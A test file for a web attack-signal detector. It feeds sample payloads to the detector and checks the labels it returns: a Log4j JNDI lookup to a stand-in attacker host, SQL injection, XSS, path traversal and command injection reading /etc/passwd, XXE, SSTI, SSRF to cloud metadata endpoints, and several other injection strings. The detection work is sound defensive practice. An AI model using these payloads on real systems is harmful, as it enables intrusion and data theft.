import { describe, expect, it } from 'vitest';
import { detectAcross, detectInString } from '../../../src/signals/detector.js';

describe('signal detector — detectInString', () => {
  it('flags log4j JNDI payloads', () => {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal JNDI payload under test
    expect(detectInString('${jndi:ldap://attacker.example/x}')).toContain('log4j');
  });

  it('flags spring4shell class.module.classLoader probes', () => {
    expect(detectInString('class.module.classLoader.resources')).toContain('spring4shell');
  });

  it('flags SQLi patterns', () => {
    expect(detectInString("' or '1'='1")).toContain('sqli');
    expect(detectInString('UNION SELECT password FROM users')).toContain('sqli');
    expect(detectInString('SLEEP(5)')).toContain('sqli');
  });

  it('flags XSS payloads', () => {
    expect(detectInString('<script>alert(1)</script>')).toContain('xss');
    expect(detectInString('<svg onload=alert(1)>')).toContain('xss');
    expect(detectInString('javascript:alert(1)')).toContain('xss');
  });

  it('flags path traversal', () => {
    expect(detectInString('/../../../etc/passwd')).toContain('path-traversal');
    expect(detectInString('/%2e%2e/etc/passwd')).toContain('path-traversal');
  });

  it('flags command injection', () => {
    expect(detectInString('; cat /etc/passwd')).toContain('cmd-injection');
    expect(detectInString('$(whoami)')).toContain('cmd-injection');
  });

  it('flags XXE', () => {
    expect(detectInString('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')).toContain(
      'xxe',
    );
  });

  it('flags SSTI', () => {
    expect(detectInString('{{7*7}}')).toContain('ssti');
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal SSTI payload under test
    expect(detectInString('${7*7}')).toContain('ssti');
  });

  it('flags SSRF metadata addresses', () => {
    expect(detectInString('http://169.254.169.254/latest/meta-data/')).toContain('ssrf-meta');
    expect(detectInString('http://metadata.google.internal/')).toContain('ssrf-meta');
  });

  it('flags NoSQL injection operators', () => {
    expect(detectInString('{"username":{"$ne":null}}')).toContain('nosqli');
  });

  it('flags LDAP injection', () => {
    expect(detectInString('*)(uid=*')).toContain('ldap-injection');
  });

  it('flags CRLF injection', () => {
    expect(detectInString('foo%0d%0aSet-Cookie:bar')).toContain('crlf');
  });

  it('flags open redirect payloads', () => {
    expect(detectInString('//evil.example')).toContain('open-redirect');
    expect(detectInString('https://example.com@evil.example')).toContain('open-redirect');
  });

  it('returns an empty list for clean input', () => {
    expect(detectInString('hello world')).toEqual([]);
  });
});

describe('signal detector — detectAcross', () => {
  it('detects signals across URL, headers, and body', () => {
    const request = new Request('http://example.test/foo?q=normal', {
      method: 'POST',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal JNDI payload under test
      headers: { 'User-Agent': '${jndi:ldap://attacker/x}' },
    });
    const body = "' or '1'='1";
    const signals = detectAcross(request, body);
    expect(signals).toContain('log4j');
    expect(signals).toContain('sqli');
  });

  it('deduplicates signals fired in multiple haystacks', () => {
    const request = new Request('http://example.test/?q=union+select+1', {
      headers: { 'X-Test': 'UNION SELECT 2' },
    });
    const signals = detectAcross(request, 'UNION SELECT 3');
    const occurrences = signals.filter((s) => s === 'sqli').length;
    expect(occurrences).toBe(1);
  });
});
